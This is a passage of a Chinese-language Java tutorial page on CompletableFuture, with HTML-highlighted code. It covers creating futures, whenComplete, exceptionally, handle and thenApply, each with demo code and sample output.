            time<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        scheduledThreadPool<span class="token punctuation">.</span><span class="token function">shutdown</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> time<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1>CompletableFuture</h1>
<h3 id="创建对象">创建对象</h3>
<h4 id="runAsync">runAsync</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> runnable<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> <span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token class-name">Runnable</span> runnable<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h4 id="supplyAsync">supplyAsync</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> supplier<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Supplier</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> supplier<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>runAsync 方法以Runnable函数式接口类型为参数，没有返回结果，</p>
<p>supplyAsync 方法Supplier函数式接口类型为参数，返回结果类型为U；</p>
<p>没有指定Executor的方法会使用ForkJoinPool.commonPool() 作为它的线程池执行异步代码。如果指定线程池，则使用指定的线程池运行</p>
<h3 id="结果处理">结果处理</h3>
<blockquote>
<p>当CompletableFuture的计算结果完成，或者抛出异常的时候，我们可以执行特定的 Action</p>
</blockquote>
<h4 id="whenComplete">whenComplete</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">Throwable</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">whenCompleteAsync</span><span class="token punctuation">(</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">Throwable</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">whenCompleteAsync</span><span class="token punctuation">(</span><span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">Throwable</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="exceptionally">exceptionally</h4>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token function">exceptionally</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Throwable</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<ul>
<li>Action的类型是BiConsumer&lt;? super T,? super Throwable&gt;，它可以处理正常的计算结果，或者异常情况。</li>
<li>方法不以Async结尾，意味着Action使用相同的线程执行，而Async可能会使用其它的线程去执行(如果使用相同的线程池，也可能会被同一个线程选中执行。</li>
<li><strong>这几个方法都会返回CompletableFuture。当Action执行完毕后，<font color="red">返回原始的CompletableFuture的计算结果或者返回异常</font>。</strong></li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CompletableFutureExample2</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">runAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> data <span class="token operator">=</span> <span class="token class-name">ThreadLocalRandom</span><span class="token punctuation">.</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>data <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：数据-"</span> <span class="token operator">+</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">12</span> <span class="token operator">/</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：执行结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        future<span class="token punctuation">.</span><span class="token function">whenComplete</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BiConsumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Void</span><span class="token punctuation">,</span> <span class="token class-name">Throwable</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">accept</span><span class="token punctuation">(</span><span class="token class-name">Void</span> t<span class="token punctuation">,</span> <span class="token class-name">Throwable</span> action<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：执行完成"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        future<span class="token punctuation">.</span><span class="token function">exceptionally</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Throwable</span><span class="token punctuation">,</span> <span class="token class-name">Void</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token annotation punctuation">@Override</span>
            <span class="token keyword">public</span> <span class="token class-name">Void</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"：执行失败，"</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token keyword">int</span> seconds<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">TimeUnit</span><span class="token punctuation">.</span><span class="token constant">SECONDS</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>seconds<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正常执行结束</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">1</span>：执行结束
<span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">1</span>：执行完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>抛出异常</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">1</span>：数据<span class="token operator">-</span><span class="token number">6</span>
<span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">1</span>：执行失败，<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ArithmeticException</span><span class="token operator">:</span> <span class="token operator">/</span> by zero
<span class="token class-name">ForkJoinPool</span><span class="token punctuation">.</span>commonPool<span class="token operator">-</span>worker<span class="token operator">-</span><span class="token number">1</span>：执行完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h4 id="handle">handle</h4>
<ul>
<li>当原先的CompletableFuture的值计算完成或者抛出异常的时候，由BiFunction参数计算，<font color="red">产生新的CompletableFuture</font></li>
</ul>
<p>这组方法兼有whenComplete和转换的两个功能（whenComplete and reture）</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token class-name">Throwable</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">handleAsync</span><span class="token punctuation">(</span><span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token class-name">Throwable</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">handleAsync</span><span class="token punctuation">(</span><span class="token class-name">BiFunction</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token class-name">Throwable</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>测试DEMO：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
	<span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
		<span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一阶段："</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">handle</span><span class="token punctuation">(</span><span class="token punctuation">(</span>number<span class="token punctuation">,</span> exception<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
		<span class="token keyword">int</span> result <span class="token operator">=</span> number <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">;</span>
		<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"二阶段："</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> result<span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">一阶段：<span class="token number">100</span>
二阶段：<span class="token number">300</span>
最终结果：<span class="token number">300</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h3 id="结果转换（Function）">结果转换（Function）</h3>
<p>所谓结果转换，就是将上一段任务的执行结果作为下一阶段任务的入参参与重新计算，<font color="red">产生新的结果</font></p>
<h4 id="thenApply">thenApply</h4>
<ol>
<li>
<p><code>thenApply</code> 接收一个函数作为参数，使用该函数处理上一个CompletableFuture 调用的结果，并返回一个具有处理结果的Future对象。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenApply</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenApplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenApplyAsync</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span><span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><strong>示例：</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ExecutionException</span><span class="token punctuation">,</span> <span class="token class-name">InterruptedException</span> <span class="token punctuation">{</span>
    <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> future <span class="token operator">=</span> <span class="token class-name">CompletableFuture</span><span class="token punctuation">.</span><span class="token function">supplyAsync</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
    <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"一阶段："</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">thenApply</span><span class="token punctuation">(</span>number <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> result <span class="token operator">=</span> number <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"二阶段："</span> <span class="token operator">+</span> result<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> result<span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终结果："</span> <span class="token operator">+</span> future<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">一阶段：<span class="token number">100</span>
二阶段：<span class="token number">300</span>
最终结果：<span class="token number">300</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
<h4 id="thenCompose">thenCompose</h4>
<ol>
<li>
<p><code>thenCompose</code>的参数为一个返回 CompletableFuture 实例的函数，该函数的参数是先前计算步骤的结果。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenCompose</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenComposeAsync</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">CompletableFuture</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span></span> <span class="token function">thenComposeAsync</span><span class="token punctuation">(</span><span class="token class-name">Function</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">,</span> <span class="token operator">?</span> <span class="token keyword">extends</span> <span class="token class-name">CompletionStage</span><span class="token punctuation">&lt;</span><span class="token class-name">U</span><span class="token punctuation">&gt;</span><span class="token punctuation">&gt;</span></span> fn<span class="token punctuation">,</span> <span class="token class-name">Executor</span> executor<span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>示例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">,</span> <span class="token class-name">ExecutionException</span> <span class="token punctuation">{</span>
